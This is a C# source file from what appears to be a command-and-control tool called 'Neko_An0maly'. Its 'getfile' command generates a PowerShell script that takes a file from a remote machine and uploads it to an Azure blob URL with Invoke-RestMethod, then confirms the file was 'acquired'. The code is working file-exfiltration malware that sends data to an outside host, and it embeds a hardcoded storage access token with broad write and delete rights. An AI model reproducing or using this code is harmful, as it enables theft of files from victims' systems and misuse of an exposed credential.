using System;
using System.IO;
using System.Text;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Threading;
using Neko_An0maly.CORE;

namespace Neko_An0maly.Commands
{
    public class GetFile : Command
    {
        public static string path = @"C:\ProgramData\";
        public static string getFilePath;
        public static string getFileName;

        public GetFile(string name) : base(name) { }

        public override string execute(string[] args)
        {
            getFilePath = args[1];
            getFileName = Path.GetFileName(getFilePath);    

            if (args.Length == 2)
            {
                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = path + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes(@"$file = " + (char)34 + args[1] + (char)34);
                    fs.Write(line1, 0, line1.Length);
                    byte[] line3 = new UTF8Encoding(true).GetBytes("\n$name = (Get-Item $file).Name");
                    fs.Write(line3, 0, line3.Length);
                    byte[] line4 = new UTF8Encoding(true).GetBytes("\n$uri = " + (char)34 + "https://previewps.blob.core.windows.net/data/$($name)?sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlacupitfx&se=2023-04-12T05:55:16Z&st=2021-11-23T21:55:16Z&spr=https,http&sig=YkdxIMDKKrObLdkUq9kOX5nosPDodaw4w6MIt4V64wo%3D" + (char)34);
                    fs.Write(line4, 0, line4.Length);
                    byte[] line5 = new UTF8Encoding(true).GetBytes("\n$headers = @{");
                    fs.Write(line5, 0, line5.Length);
                    byte[] line6 = new UTF8Encoding(true).GetBytes("\n" + @"    'x-ms-blob-type' = 'BlockBlob'");
                    fs.Write(line6, 0, line6.Length);
                    byte[] line7 = new UTF8Encoding(true).GetBytes("\n}");
                    fs.Write(line7, 0, line7.Length);
                    byte[] line8 = new UTF8Encoding(true).GetBytes("\nInvoke-RestMethod -Uri $uri -Method Put -Headers $headers -InFile $file");
                    fs.Write(line8, 0, line8.Length);
                    byte[] line9 = new UTF8Encoding(true).GetBytes("\nRename-Item $file");
                    fs.Write(line9, 0, line9.Length);
                }

                Console.WriteLine("Initializing upload.");

                TransferProtocol.upload(finalPath);
                TransferProtocol.download(path);
                check();

                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'getfile'. Requires 2 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }

        public static void check()
        {
            if (!File.Exists(path + getFileName))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Failed to aquire file.");
                Console.ForegroundColor = ConsoleColor.White;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("File aquired successfully.");
                Console.ForegroundColor = ConsoleColor.White;

            }
        }
    }
}
